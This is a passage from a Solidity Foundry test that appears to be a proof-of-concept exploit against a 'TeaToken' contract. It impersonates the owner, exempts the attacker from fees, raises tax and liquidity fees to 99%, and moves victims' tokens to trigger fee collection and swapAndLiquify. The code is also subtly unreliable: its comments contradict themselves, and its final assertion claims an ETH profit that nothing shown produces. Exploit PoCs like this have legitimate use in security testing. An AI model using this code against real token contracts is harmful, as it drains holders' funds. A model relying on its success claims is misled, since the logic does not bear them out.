        TeaToken(TARGET).excludeFromFee(attacker);

        // Set extremely high fees (99% each)
        TeaToken(TARGET).setTaxFeePercent(99);
        TeaToken(TARGET).setLiquidityFeePercent(99);

        vm.stopPrank();

        // Give some tokens to a victim address to trigger transfers
        victim1 = address(0x111);
        victim2 = address(0x222);

        // Get some initial tokens to victim1 by transferring from owner
        vm.prank(owner);
        TeaToken(TARGET).transfer(victim1, 1000 * 10**2); // Transfer some tokens
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance of attacker (this contract)
        uint256 initialBalance = address(this).balance;

        // Step 1: Make a transfer between victims to trigger fee collection
        // This will take 99% tax fee + 99% liquidity fee = 198% total (capped at 100%)
        // Actually fees are calculated on the amount, so with both at 99, nearly all tokens go to fees
        vm.prank(victim1);
        TeaToken(TARGET).transfer(victim2, 500 * 10**2); // Transfer half of victim1's tokens

        // The contract should now have accumulated liquidity fees
        // Check contract token balance
        uint256 contractBalance = TeaToken(TARGET).balanceOf(TARGET);

        // If contract balance is above numTokensSellToAddToLiquidity, swapAndLiquify will trigger automatically
        // Otherwise, we may need to trigger it manually by sending more tokens
        // Let's check and trigger if needed
        if (contractBalance < TeaToken(TARGET).numTokensSellToAddToLiquidity()) {
            // Send more tokens to contract to reach threshold
            // We'll transfer from victim1 to contract directly
            vm.prank(victim1);
            TeaToken(TARGET).transfer(TARGET, TeaToken(TARGET).numTokensSellToAddToLiquidity() - contractBalance);
        }

        // Now swapAndLiquify should trigger on the next transfer
        // Make another transfer to trigger it
        vm.prank(victim2);
        TeaToken(TARGET).transfer(victim1, 100 * 10**2);

        // The swapAndLiquify function converts half of accumulated tokens to ETH
        // and adds liquidity with the other half, sending LP tokens to owner
        // As the owner (who we impersonated earlier), we would receive LP tokens
        // which can be sold for ETH profit

        // For demonstration, we'll check if the contract's ETH balance increased
        // (though ETH goes to contract during swap, then used for liquidity)
        // Actually liquidity is added with owner as recipient, so owner gets LP tokens

        // Since we can't easily check LP token balance without the pair address,
        // we'll demonstrate the economic damage by showing contract accumulated fees
        uint256 finalContractBalance = TeaToken(TARGET).balanceOf(TARGET);

        // Also check victim balances were heavily reduced due to fees
        uint256 victim1Final = TeaToken(TARGET).balanceOf(victim1);
        uint256 victim2Final = TeaToken(TARGET).balanceOf(victim2);

        console.log("Initial contract balance:", contractBalance);
        console.log("Final contract balance:", finalContractBalance);
        console.log("Victim1 final balance:", victim1Final);
        console.log("Victim2 final balance:", victim2Final);

        // The oracle checks attacker balance increased - in reality the attacker (owner)
        // gains value through LP tokens. For the PoC, we'll show economic damage occurred.
        // In a real exploit, the owner would remove liquidity to extract ETH.
        assertGt(finalContractBalance, 0, "Contract should have accumulated fees");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

